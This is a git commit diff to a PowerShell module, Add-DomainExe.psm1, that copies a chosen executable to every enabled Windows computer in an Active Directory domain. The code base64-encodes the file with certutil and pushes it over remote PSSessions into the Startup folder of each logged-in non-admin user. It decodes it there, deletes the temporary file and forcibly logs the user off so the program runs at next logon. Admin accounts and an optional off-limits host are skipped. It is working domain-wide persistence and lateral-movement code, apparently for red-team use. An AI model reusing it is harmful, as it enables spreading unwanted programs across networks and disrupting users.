f96825b8162188c06181cf819ab26fd60fa417c9
molarom <90418639+molarom@users.noreply.github.com>
2021-11-23 21:16:41 -0500

    Update Add-DomainExe.psm1

--- Add-DomainExe.psm1
+++ Add-DomainExe.psm1
@@ -17,16 +17,30 @@ function Add-DomainExe {
         return $true
         })]$FilePath,
         [parameter(mandatory=$true)]$Username,
-        [parameter(mandatory=$true)]$Password
+        [parameter(mandatory=$true)]$Password,
+        $OffLimits
 
     )
-    $c = Get-Content $FilePath
+
+    
     
     # String clean up for later use.
     $inputpath = $FilePath -split "\\"
     $file_split = $inputpath[-1]
     $file_split2 = $file_split -split "\."
-    $program = $FilePath[0]
+    $program = $file_split2[0]
+    $prog_ext = $file_split2[-1]
+
+    # Creating temp file for b64 encode and transfer.
+    $filetrim = $FilePath.TrimEnd(".$prog_ext")
+    $tempFilePath = "$filetrim" + ".temp"
+    $tempfile = "$program" + ".temp"
+
+    # Base64 encoding to ensure entire contents are passed over the wire.
+    Write-Host "[*] Creating temporary base64 file for transfer..."
+    certutil -encode $FilePath $tempFilePath > $null
+    $c = Get-Content $tempFilePath
+    del $tempFilePath
 
     # Credential variable without prompt
     $user = $Username
@@ -37,63 +51,60 @@ function Add-DomainExe {
     $computers = Get-ADComputer -Filter 'operatingsystem -like "*windows*" -and enabled -eq "true"' | Select-Object -ExpandProperty Name
     
     foreach($computer in $computers) {
-        Write-Host "[+] Attempting to connect to: [$computer]..."
-        
-        # Check if the process is running.
-        $prog_running = Invoke-Command -ComputerName $computer -Credential $adm_credential -ScriptBlock { param ($proc) Get-Process $proc -ErrorAction SilentlyContinue} -argumentlist $program
-          
-        if ( $prog_running -ne $null) {
-            Write-Output "The program is running on [$computer]. No further action necessary."
-        }
-
-        else {
             try {
+                #Offlimits
+                if ($computer -like $OffLimits) {"[!] $($computer) is offlimits. Ignoring host."} else { 
+
                 # Create a remote PSsession for interaction with the workstation.
-                Write-Host "[+] Attempting to connect to  [$computer]"
-                $s = New-PSSession -ComputerName $computer -Credential $adm_credential -ErrorAction SilentlyContinue
+                Write-Host "[+] Attempting to connect to: [$computer]..."
+                $s = New-PSSession -ComputerName $computer -Credential $adm_credential -ErrorAction Stop
 
-                
-                Copy-Item $FilePath -Destination $remoteHostPath -ToSession $s
-
-                try {
+                # Check if the process is running.
+                $prog_running = Invoke-Command -Session $s -ScriptBlock { param ($proc) Get-Process $proc -ErrorAction SilentlyContinue} -argumentlist $program
+      
+                if ( $prog_running -ne $null) {
+                    Write-Output "[*] The program is running on [$computer]. No further action necessary."
+                }
+                else{
+                    $host_count += 1
                     # Get the current user's login id.
-                    $user_regex = quesr | ForEach-Object -Process {'\s{2,}',','}
+                    $user_regex = Invoke-Command -Session $s -ScriptBlock { quser } -ErrorAction Stop | ForEach-Object -Process {$_ -replace '\s{2,}',','}
                     $user_object = $user_regex | ConvertFrom-Csv
-                    Write-Host "[+] Found $($user_object.Count) user login(s) on computer."
+
+                    #Getting metrics for number of users.
+                    $user_count = $user_object | Measure-Object
+
+                    Write-Host "[+] Found $($user_count.Count) user login(s) on computer."
                     $user_object | ForEach-Object{
                         if ($_.Username -match "adm.*"){
                             Write-Host "[!] Current logged in user is an admin. Ignoring."
                         }
                         else {
-                            Write-Host "[+] Placing [$Program] on [$computer] for [$_.Username]..."
+                            Write-Host "[+] Placing [$Program] on [$computer] for [$($_.Username)]..."
+                            $remoteTempPath = "C:\Users\"+ $_.Username +"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" + $tempfile
                             $remoteHostPath = "C:\Users\"+ $_.Username +"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" + $file_split
-                            invoke-command -script {param($remoteFile,$contents) set-content -path $remoteFile -value $contents} -argumentlist $remoteFile,$c
-                            Write-Host "[+] Logging off $_.Username..."
-                            logoff $_.sessionname
+                            invoke-command -session $s -script {param($remoteFile,$contents) set-content -path $remoteFile -value $contents} -argumentlist $remoteTempPath,$c -ErrorAction Stop
+                            $profile_count += 1
+                            Write-Host "[*] Decoding file and cleaning up temporary file..."
+                            Invoke-Command -Session $s -script {param($remoteTemp,$remotePath) certutil -decode "$remoteTemp" "$remotePath" > $null; del "$remoteTemp" } -ArgumentList $remoteTempPath,$remoteHostPath -ErrorVariable $registry_err
+                            Write-Host "[+] Logging off $($_.Username)..."
+                            invoke-command -session $s -script {param ($quser_object) logoff $quser_object.sessionname} -ArgumentList $_
                         }
                     }
-                }
-
-
-                catch {
-                    if ($_.Exception.Message -match 'No User exists'){
-                    Write-Host "[!] No users are logged in. Ignoring."
-                }
-                else {
-                    throw $_.Exception.Message
-                }
-            }                
                 Remove-PSSession $s
+                }}
             }
-
-            # If can't connect, print a short message.
-            catch [System.UnauthorizedAccessException] {
-                Write-Warning -Message "[-] Access Denied: [$computer]"
+            catch [System.Management.Automation.Remoting.PSRemotingTransportException] {
+                Write-Host "[!] Unable to authenticate to [$computer]."
+                continue
             }
+            catch {
+                Write-Host "[-] $computer - $($_[0])"
+                continue
+            }  
         Write-Host ""
         }
-    }
-    Write-Host "[+] [$Program] installed on all hosts!"
+    if ($profile_count -gt 0) {Write-Host "[+] Accessed $($host_count) host and installed [$Program] in $($profile_count) Roaming profiles!"} else {Write-Host "[-] [$Program] not installed on any hosts."} 
 }
 
 <#
